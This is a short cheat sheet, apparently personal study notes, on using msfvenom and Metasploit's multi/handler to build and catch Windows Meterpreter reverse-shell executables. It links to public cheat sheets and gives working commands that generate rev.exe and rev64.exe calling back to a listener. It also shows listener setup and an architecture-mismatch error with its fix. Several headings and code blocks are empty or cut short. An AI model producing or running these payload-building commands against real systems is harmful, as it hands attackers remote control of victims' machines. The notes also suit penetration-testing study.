[MSFVenom - CheatSheet
 by hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)

[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter by infinitelogins)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

### Syntax
```
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>
```

### Common
```
myip=127.0.0.1

msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -f exe -o rev.exe
```

### Capture 
```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > grep yes options
   LHOST                   yes       The listen address (an interface may be specified)                                              
   LPORT  4444             yes       The listen port
```

```
msfvenom -l payloads
```

```
msfvenom -l payloads |
```

## Common Mistake
### 
```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Error: The selected arch is incompatible with the payload
```

### 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev64.exe
```

### 
```
$ file rev64.exe 
rev64.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```

### 
```

```
